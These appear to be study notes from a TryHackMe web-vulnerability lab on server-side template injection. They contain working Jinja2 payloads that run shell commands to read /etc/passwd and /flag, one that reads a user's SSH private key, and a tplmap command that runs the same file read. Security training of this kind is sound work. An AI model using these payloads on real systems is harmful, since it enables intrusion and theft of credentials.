# Room
https://tryhackme.com/room/zthobscurewebvulns

# Task 1 - Intro
The larger vulnerabilities in web applications are:
* SSTI
* CSRF
* JWT
* XXE

# Task 2 - Methodology
Sections

# Task 3 - SSTI - What is SSTI
SSTI - Server Side Template Injection.  Template engines allow developers to use static HTML pages with dynamic parts such as a username.  Different template engines have different injection payloads.

# Task 4 - SSTI - Manual exploitation of SSTI
Research
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection

Examples
* Use cat to read the /etc/passwd
    ```
    {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
    ```
* Use read to view test's SSH private key
    ```
    {{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}}
    ```

# Task 5 - SSTI - Automatic exploitation of SSTI
Tool to detect SSTI
* https://github.com/epinna/tplmap

Examples
* Grab /etc/passwd with a vulnerable parameter
    ```
    tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'
    ```

# Task 6 - SSTI - Challenge
Use SSTI to read /flag
```
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

